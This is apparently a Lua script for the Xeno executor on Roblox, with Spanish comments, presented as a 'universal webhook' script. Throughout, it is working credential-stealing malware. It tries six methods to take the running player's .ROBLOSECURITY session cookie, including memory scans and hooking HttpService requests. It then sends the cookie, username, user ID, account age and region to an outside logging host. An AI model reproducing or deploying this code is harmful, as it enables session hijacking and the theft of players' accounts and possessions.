-- =====================================================================
-- SCRIPT UNIVERSAL DE WEBHOOK - OPTIMIZADO PARA XENO PC
-- =====================================================================
print("🔧 Funciones disponibles en Xeno:")
print("  - getcookie:", type(getcookie))
print("  - getgc:", type(getgc))
print("  - getreg:", type(getreg))
print("  - hookfunction:", type(hookfunction))
print("  - getgenv:", type(getgenv))
local Players = game:GetService("Players")
local LocalizationService = game:GetService("LocalizationService")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
local placeId = game.PlaceId

-- 1. FUNCIÓN AVANZADA DE EXTRACCIÓN DE COOKIES (OPTIMIZADA PARA XENO)
local function GetUniversalCookie()
    local cookieValue = nil
    
    -- Método 1: getcookie() (por si Xeno lo tiene)
    if type(getcookie) == "function" then
        local success, cookie = pcall(getcookie)
        if success and cookie and tostring(cookie) ~= "" then
            cookieValue = tostring(cookie)
            print("✅ Cookie obtenida con getcookie()")
        end
    end
    
    -- Método 2: Variables de entorno
    if not cookieValue then
        local envNames = {"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "rbx_cookie"}
        for _, name in ipairs(envNames) do
            local env = getgenv()
            if env[name] and tostring(env[name]) ~= "" then
                cookieValue = tostring(env[name])
                print("✅ Cookie obtenida de getgenv()." .. name)
                break
            end
        end
    end
    
    -- Método 3: getgc() - Búsqueda profunda en Xeno
    if not cookieValue and type(getgc) == "function" then
        print("🔍 Buscando en getgc()...")
        local success, gc = pcall(getgc)
        if success and gc then
            for i, obj in ipairs(gc) do
                if type(obj) == "table" then
                    -- Buscar recursivamente en tablas
                    local function searchTable(tbl, depth)
                        if depth > 3 then return nil end -- Limitar profundidad
                        for key, value in pairs(tbl) do
                            if type(value) == "string" and string.find(value, "_|WARNING:-DO%-NOT%-SHARE%-THIS") then
                                return value
                            elseif type(value) == "table" then
                                local found = searchTable(value, depth + 1)
                                if found then return found end
                            end
                        end
                        return nil
                    end
                    
                    local found = searchTable(obj, 0)
                    if found then
                        cookieValue = found
                        print("✅ Cookie encontrada en getgc() tabla #" .. i)
                        break
                    end
                elseif type(obj) == "string" and string.find(obj, "_|WARNING:-DO%-NOT%-SHARE%-THIS") then
                    cookieValue = obj
                    print("✅ Cookie encontrada en getgc() string #" .. i)
                    break
                end
            end
        end
    end
    
    -- Método 4: getreg() - Búsqueda en registro
    if not cookieValue and type(getreg) == "function" then
        print("🔍 Buscando en getreg()...")
        local success, reg = pcall(getreg)
        if success and reg then
            for i, obj in ipairs(reg) do
                if type(obj) == "string" and string.find(obj, "_|WARNING:-DO%-NOT%-SHARE%-THIS") then
                    cookieValue = obj
                    print("✅ Cookie encontrada en getreg() #" .. i)
                    break
                elseif type(obj) == "table" then
                    for key, value in pairs(obj) do
                        if type(value) == "string" and string.find(value, "_|WARNING:-DO%-NOT%-SHARE%-THIS") then
                            cookieValue = value
                            print("✅ Cookie encontrada en getreg() tabla #" .. i)
                            break
                        end
                    end
                    if cookieValue then break end
                end
            end
        end
    end
    
    -- Método 5: hookfunction() - Intercepting HttpService (OPTIMIZADO PARA XENO)
    if not cookieValue and type(hookfunction) == "function" then
        print("🔍 Usando hookfunction() para capturar cookie...")
        local captured = nil
        
        -- Hook de RequestAsync
        local oldRequestAsync
        oldRequestAsync = hookfunction(HttpService.RequestAsync, function(self, options)
            -- Capturar cookie de los headers
            if options.Headers then
                if options.Headers.Cookie then
                    captured = options.Headers.Cookie
                    print("📥 Cookie capturada de Headers.Cookie")
                elseif options.Headers.cookie then
                    captured = options.Headers.cookie
                    print("📥 Cookie capturada de Headers.cookie")
                end
            end
            
            -- También buscar en el body si es formulario
            if options.Body and type(options.Body) == "string" then
                local cookieMatch = string.match(options.Body, "_|WARNING:[^\"']+")
                if cookieMatch then
                    captured = cookieMatch
                    print("📥 Cookie capturada del Body")
                end
            end
            
            return oldRequestAsync(self, options)
        end)
        
        -- Hacer peticiones para trigger el hook
        local urlsToTry = {
            "https://www.roblox.com/",
            "https://auth.roblox.com/",
            "https://users.roblox.com/"
        }
        
        for _, url in ipairs(urlsToTry) do
            pcall(function()
                HttpService:GetAsync(url)
            end)
            if captured then break end
        end
        
        if captured then
            -- Limpiar el formato de cookie
            if string.find(captured, ".ROBLOSECURITY=") then
                cookieValue = string.match(captured, ".ROBLOSECURITY=([^;]+)")
            else
                cookieValue = captured
            end
            print("✅ Cookie capturada con hookfunction()")
        end
    end
    
    -- Método 6: CookieService (último recurso)
    if not cookieValue then
        local success, CookieService = pcall(function() 
            return game:GetService("CookieService") 
        end)
        if success and CookieService then
            local success2, savedCookie = pcall(function() 
                return CookieService:GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com") 
            end)
            if success2 and savedCookie and tostring(savedCookie) ~= "" then
                cookieValue = tostring(savedCookie)
                print("✅ Cookie obtenida de CookieService")
            end
        end
    end
    
    if cookieValue then
        return ".ROBLOSECURITY=" .. cookieValue
    end
    
    return "COOKIE_NO_DISPONIBLE"
end

-- 2. FUNCIONES AUXILIARES
local function GetAccountAge()
    return tostring(player.AccountAge) .. " días"
end

local function GetRegion()
    local success, region = pcall(function()
        return LocalizationService.RobloxLocaleId
    end)
    return success and tostring(region) or "Desconocida"
end

-- 3. RECOPILACIÓN DE DATOS
print("🚀 Iniciando extracción de datos...")
local data = {
    username = player.Name,
    displayName = player.DisplayName,
    userId = player.UserId,
    gameId = placeId,
    accountAge = GetAccountAge(),
    region = GetRegion(),
    cookie = GetUniversalCookie()
}

print("📊 Datos recopilados:")
print("  - Usuario:", data.username)
print("  - Cookie:", data.cookie ~= "COOKIE_NO_DISPONIBLE" and "✅ Detectada" or "❌ No detectada")

-- 4. ENVÍO DEL WEBHOOK
local webhookUrl = "https://depazzhub-api.onrender.com/log"
local jsonData = HttpService:JSONEncode(data)

local success, result = pcall(request, {
    Url = webhookUrl,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = jsonData
})

if success then
    print("✅ Webhook enviado correctamente!")
else
    warn("❌ Error:", result)
end
